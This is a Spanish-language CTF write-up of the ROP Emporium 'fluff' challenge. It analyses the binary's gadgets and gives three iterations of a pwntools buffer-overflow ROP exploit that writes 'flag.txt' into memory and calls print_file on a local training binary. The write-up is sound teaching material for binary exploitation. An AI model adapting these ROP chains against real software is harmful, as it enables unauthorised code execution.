---
layout: post
title: Fluff ROP Emporium (x86_64)
comments: true
categories: [Pwn, Writeups, ROPEmporium]
---

Este es otro post de la serie de writeups de [ROP Emporium](https://ropemporium.com/challenge/split.html). Con esta serie de posts aprenderemos sobre una de las técnicas más utilizadas en la explotación de binarios, la [***ROP***]({% post_url 2024-08-15-ROP %}), ó *Return Orineted Programming* (Programación orientada a *return*).

Concretamente en este reto, trabajaremos con gadgets bastante más engorrosos de utilizar. Créditos para el [Writeup](https://hackmd.io/@Broder/RopEmporium#Fluff) que me ayudó a resolverlo por primera vez.


# Reconocimiento

Como siempre comenzamos lanzando checksec:

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
RUNPATH:  b'.'
```

Igual que los anteriores, solo tenemos activado el *NX bit*, por lo que irá por un ataque de tipo [***ROP***]({% post_url 2024-08-15-ROP %}).

El enunciado sólo nos dice que el reto irá en la linea de los anteriores, pero con gadgets ligeramente más complejos.

Analizaremos ahora con gdb-pwndbg:

```
0x00000000004004d0  _init
0x0000000000400500  pwnme@plt
0x0000000000400510  print_file@plt
0x0000000000400520  _start
0x0000000000400550  _dl_relocate_static_pie
0x0000000000400560  deregister_tm_clones
0x0000000000400590  register_tm_clones
0x00000000004005d0  __do_global_dtors_aux
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400628  questionableGadgets
0x0000000000400640  __libc_csu_init
0x00000000004006b0  __libc_csu_fini
0x00000000004006b4  _fini
```

Vemos que es similar a los anteriores, tendremos que llamar a *print_file* con `flag.txt` como argumento. Además contamos con nuestro *usefulFunction* con la llamada a *printfile* y otra función *questionableGadgets* con los gadgets que probablemente tendremos que utilizar.

```
pwndbg> disass questionableGadgets 
Dump of assembler code for function questionableGadgets:
   0x0000000000400628 <+0>:	xlat   BYTE PTR ds:[rbx]
   0x0000000000400629 <+1>:	ret
   0x000000000040062a <+2>:	pop    rdx
   0x000000000040062b <+3>:	pop    rcx
   0x000000000040062c <+4>:	add    rcx,0x3ef2
   0x0000000000400633 <+11>: bextr  rbx,rcx,rdx
   0x0000000000400638 <+16>: ret
   0x0000000000400639 <+17>: stos   BYTE PTR es:[rdi],al
   0x000000000040063a <+18>: ret
   0x000000000040063b <+19>: nop    DWORD PTR [rax+rax*1+0x0]
```

Si analizamos con ROPGadget u otra herramienta veremos que no hay ningún gadget `mov [reg], reg` que nos permita cargar nuestro string `flag.txt`. Por tanto nos centraremos en *questionableGadgets*.

[**xlat**](https://stackoverflow.com/questions/47556705/what-does-xlat-instruction-do-in-8086)
> En C sería algo como:
```c
const uint8_t table[256] = { ...some byte constants (table data) ... };
const uint8_t* ds_bx = table;
uint8_t al = <some value to translate>;
al = ds_bx[al]; // al = table[al];
// like "mov al,[ds:bx + al]" in ASM
```

Siguiendo el hilo llegamos a la conclusión de que es una forma de controlar *rax* desde *rbx*.

[**bextr**](https://stackoverflow.com/questions/70208751/how-does-the-bextr-instruction-in-x86-work)
> Extracts contiguous bits from the first source operand (the second operand) using an index value and length value specified in the second source operand (the third operand).

> A picture might help. Say the starting bit is 5 and the length is 9. Then if we have

```
Input : 11010010001110101010110011011010 = 0xd23aacda
                          |-------|
                              \
                               \
                                \
                                 v
                               |-------|
Output: 00000000000000000000000101100110 = 0x00000166
```

```
bextr  rbx,rcx,rdx
```

Básicamente, copia bits de *rcx* a *rbx*, dependiendo en *rdx*.

Los bits de rdx significarán:

| 15<–––>8 | 7<–––>0       |
| -------- | ------------- |
| Tamaño   | Bit de inicio |

Si queremos copiar todo *rcx* en *rbx*, *rdx* debe valer `0x4000`.

| 15–––->8 | 7<–––>0  |
| -------- | -------- |
| 01000000 | 00000000 |
Lo que significa que podemos controlar *rbx* utilizando *rcx* y *rdx*.

[stos](https://www.felixcloutier.com/x86/stos:stosb:stosw:stosd:stosq)
> The STOS instruction copies the data item from AL (for bytes - STOSB), AX (for words - STOSW) or EAX (for doublewords - STOSD) to the destination string, pointed to by ES:DI in memory.

Es decir, con estos gadgets, podemos:

- Modificar un bit de *rdi*, desde *al*.
- Modificar *al*, desde *rbx*.
- Modificar *rbx*, desde *rcx* y *rdx*.

# Explotación

Antes de empezar debemos tener en cuenta una cosa:

```
0x000000000040062a <+2>: pop    rdx
0x000000000040062b <+3>: pop    rcx
0x000000000040062c <+4>: add    rcx,0x3ef2
0x0000000000400633 <+11>: bextr  rbx,rcx,rdx
0x0000000000400638 <+16>: ret
```

Si nos fijamos, suma `0x3ef2` a *rcx*, por lo que antes de llamar a dicho gadget debemos restar dicho valor.

Continuando:

```
0x0000000000400628 <+0>:	xlat   BYTE PTR ds:[rbx]
0x0000000000400629 <+1>:	ret
```

Debemos hacer que *al* valga `0`, ya que lo que hace es almacenar en *al*, `al + rbx[al]`. Para ello tenemos varios gadgets:

```
0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
```

Finalmente, como no podemos pasar la string `flag.txt`, debemos buscarla en el binario, además no está como tal, por lo que tomaremos carácter a carácter:

```
(0x4003c4, 0), # 'f'
(0x4003c5, 1), # 'l'
(0x4003d6, 2), # 'a'
(0x4003cf, 3), # 'g'
(0x40024e, 4), # '.'
(0x400192, 5), # 't'
(0x400246, 6), # 'x'
(0x400192, 7), # 't'
```

Una primera aproximación sería:

```python
from pwn import *


offset = b'A'*40
subtract = 0x3ef2

xlatb_ret = p64(0x400628)
poprdx_rcx_addrcx_bextr_ret = p64(0x40062a)
stosrdi_ret = p64(0x400639)
poprdi_ret = p64(0x4006a3)
moveax0_poprbp_ret = p64(0x400610)
ret = p64(0x400295)

addr_flag = ['0x4003c4', '0x4003c5' , '0x4003d6', '0x4003cf', '0x40024e', '0x400192', '0x400246', '0x400192']
addr_str = 0x601028
print_file = p64(0x400510)

payload = offset 

for i in range(len(addr_flag)):
    payload += moveax0_poprbp_ret
    payload += p64(1)                   #for rbp
    payload += poprdx_rcx_addrcx_bextr_ret
    payload += p64(0x4000)                   #take 8 bytes
    payload += p64(int(addr_flag[i], 16) - subtract)         # take correct value rcx: the address contain char in "flag.txt"
    payload += xlatb_ret                #take the one byte at the address which stores in rbx to al 
    payload += poprdi_ret
    payload += p64(addr_str + i)
    payload += stosrdi_ret
    
payload += poprdi_ret
payload += p64(addr_str)
payload += ret
payload += print_file

with open("debug", "wb") as binary_file:
    binary_file.write(payload)
    
r = process('./fluff')
r.recvuntil(b'> ')
r.sendline(payload)
r.interactive()
```

Sin embargo, este script no funciona, ya que el payload es demasiado largo.

Una forma de acortarlo sería cambiar este gadget:

```
0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
```

En lugar de poner *eax* a 0, podemos directamente restar en *rbx*. La cosa es *qué* valor, empezamos restando *rax* a *rbx*, después, restamos el valor de *rbx* a *rax*. Hay que tener en cuenta que restar a *rbx* afecta al valor que popeamos en *rcx*.

El segundo script sería:

```python
from pwn import *


offset = b'A'*40
subtract = 0x3ef2

xlatb_ret = p64(0x400628)
poprdx_rcx_addrcx_bextr_ret = p64(0x40062a)
stosrdi_ret = p64(0x400639)
poprdi_ret = p64(0x4006a3)
moveax0_poprbp_ret = p64(0x400610)
ret = p64(0x400295)

addr_flag = ['0x4003c4', '0x4003c5' , '0x4003d6', '0x4003cf', '0x40024e', '0x400192', '0x400246', '0x400192']
addr_str = 0x601028
print_file = p64(0x400510)

payload = offset 

flag_str = b"flag.txt"

for i in range(len(addr_flag)):
    if(i == 0):
        sub_rax = 0xb
    if(i != 0):
        sub_rax = flag_str[i - 1]
    payload += poprdx_rcx_addrcx_bextr_ret
    payload += p64(0x4000)                                              #take 8 bytes
    payload += p64(int(addr_flag[i], 16) - subtract - sub_rax)          # take correct value rcx: the address contain char in "flag.txt"
    payload += xlatb_ret                                                #take the one byte at the address which stores in rbx to al 
    payload += poprdi_ret
    payload += p64(addr_str + i)
    payload += stosrdi_ret
    
payload += poprdi_ret
payload += p64(addr_str)
payload += ret
payload += print_file

with open("debug", "wb") as binary_file:
    binary_file.write(payload)
    
r = process('./fluff')
r.recvuntil(b'> ')
r.sendline(payload)
r.interactive()
```

Este script funcionará en según qué máquinas, pero en otras dará error en la alineación del stack. Además, no podemos añadir ninguna instrucción porque nos volvemos a pasar de longitud.

Sin embargo, si debugeamos un poco nos daremos cuenta de que después de stos `BYTE PTR es:[rdi],al`, `rdi = rdi + 1`, que es precisamente el valor que necesitamos, por lo que no necesitamos un segundo `pop rdi`. Así el segundo script quedaría:

```python
from pwn import *


offset = b'A'*40
subtract = 0x3ef2

xlatb_ret = p64(0x400628)
poprdx_rcx_addrcx_bextr_ret = p64(0x40062a)
stosrdi_ret = p64(0x400639)
poprdi_ret = p64(0x4006a3)
moveax0_poprbp_ret = p64(0x400610)
ret = p64(0x400295)

addr_flag = ['0x4003c4', '0x4003c5' , '0x4003d6', '0x4003cf', '0x40024e', '0x400192', '0x400246', '0x400192']
addr_str = 0x601028
print_file = p64(0x400510)

payload = offset 

flag_str = b"flag.txt"

for i in range(len(addr_flag)):
    if(i == 0):
        sub_rax = 0xb
    if(i != 0):
        sub_rax = flag_str[i - 1]
    payload += poprdx_rcx_addrcx_bextr_ret
    payload += p64(0x4000)                                              #take 8 bytes
    payload += p64(int(addr_flag[i], 16) - subtract - sub_rax)          # take correct value rcx: the address contain char in "flag.txt"
    payload += xlatb_ret                                                #take the one byte at the address which stores in rbx to al 
    if(i == 0):
        payload += poprdi_ret
        payload += p64(addr_str + i)
    payload += stosrdi_ret
    
payload += poprdi_ret
payload += p64(addr_str)
payload += ret
payload += print_file

with open("debug", "wb") as binary_file:
    binary_file.write(payload)
    
r = process('./fluff')
r.recvuntil(b'> ')
r.sendline(payload)
r.interactive()
```

Y después de ésta optimización, ya deberíamos obtener nuestra flag. Este es el reto que menos me ha gustado, debido al salto de complejidad y a la dificultad de uso de los gadgets. Sin embargo, reconozco que es un reto que nos permite afianzar nuestros conceptos.

¡Nos vemos en el siguiente post!